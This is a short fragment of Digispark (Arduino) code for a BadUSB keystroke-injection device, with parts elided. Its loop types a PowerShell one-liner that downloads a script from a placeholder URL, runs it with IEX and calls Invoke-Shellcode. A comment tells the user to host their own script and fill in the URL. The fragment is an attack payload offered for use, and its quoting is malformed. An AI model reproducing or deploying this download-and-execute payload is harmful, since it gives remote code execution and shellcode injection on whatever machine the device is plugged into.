...
void loop() {
  ...
  DigiKeyboard.delay(250);
  DigiKeyboard.println("powershell "IEX (New-Object Net.WebClient).DownloadString('URL_OF_CUSTOM_SCRIPT'); Invoke-Shellcode -Force\""); // Edit the URL after hosting your custom script based on the template
  DigiKeyboard.delay(250);
